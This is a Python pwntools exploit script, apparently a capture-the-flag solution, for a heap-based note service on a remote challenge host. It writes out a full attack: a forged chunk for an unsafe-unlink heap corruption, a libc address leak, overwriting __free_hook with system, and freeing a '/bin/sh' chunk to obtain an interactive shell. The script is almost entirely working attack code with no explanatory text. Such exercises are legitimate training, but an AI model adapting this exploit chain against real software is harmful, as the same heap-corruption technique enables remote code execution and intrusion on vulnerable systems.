#! /usr/bin/env python
from pwn import *

def new(size, content):
    io.sendafter("choice> ", "1")
    io.sendafter("size: ", str(size))
    io.sendafter("content: ", content)

def print_note(index):
    io.sendafter("choice> ", "2")
    io.sendafter("index: ", str(index))
    return io.recvline()[:-1]

def edit_note(index, length, content):
    io.sendafter("choice> ", "3")
    io.sendafter("index: ", str(index))
    io.sendafter("length: ", str(length))
    io.sendafter("content: ", str(content))

def delete_note(index):
    io.sendafter("choice> ", "4")
    io.sendafter("index: ", str(index))

#io = remote("localhost", 8888)
io = remote("csie.ctf.tw", 10134)

# libc
leak_offset = 0x3c38e0
system_offset = 0x45390 
hook_offset = 0x3c57a8 

new(0x108, '123')
new(0x108, '123')
new(0x108, '/bin/sh\x00')

FD = 0x602040 - 0x18
BK = 0x602040 - 0x10
edit_note(0, 0x200, p64(0) + p64(0x101) + p64(FD) + p64(BK) + 'a'*0xe0 + p64(0x100) + p64(0x110))

delete_note(1)

# leak libc
edit_note(0, 0x100, 'a'*8)
leak_libc = u64(print_note(0)[-6:].ljust(8,'\x00'))

libc_base = leak_libc - leak_offset
print hex(libc_base)

# hiject __free_hook
__free_hook = libc_base + hook_offset
system_libc = libc_base + system_offset
edit_note(0, 0x100, p64(0) + p64(leak_libc) + p64(0) + p64(__free_hook) + p64(0x602050))
raw_input('1')
edit_note(0, 0x100, p64(system_libc))

delete_note(2)

io.interactive()
